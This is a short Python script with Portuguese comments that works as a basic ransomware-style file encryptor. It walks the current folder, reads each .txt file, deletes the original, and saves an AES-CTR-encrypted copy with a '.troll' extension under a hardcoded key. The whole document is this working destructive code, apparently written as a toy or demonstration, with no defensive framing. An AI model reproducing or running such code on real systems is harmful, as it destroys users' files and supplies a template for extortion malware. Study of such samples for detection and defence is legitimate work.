import os
import pyaes

# chave de criptografia
key = b"victorreis123456"
aes = pyaes.AESModeOfOperationCTR(key)

# criptografar todos os arquivos .txt na pasta
for file_name in os.listdir():
    if file_name.endswith(".txt"):
        # abrir o arquivo a ser criptografado
        with open(file_name, "rb") as file:
            file_data = file.read()

        # remover o arquivo original
        os.remove(file_name)

        # criptografar o arquivo
        crypto_data = aes.encrypt(file_data)

        # salvar o arquivo criptografado
        new_file_name = file_name + ".troll"
        with open(new_file_name, "wb") as new_file:
            new_file.write(crypto_data)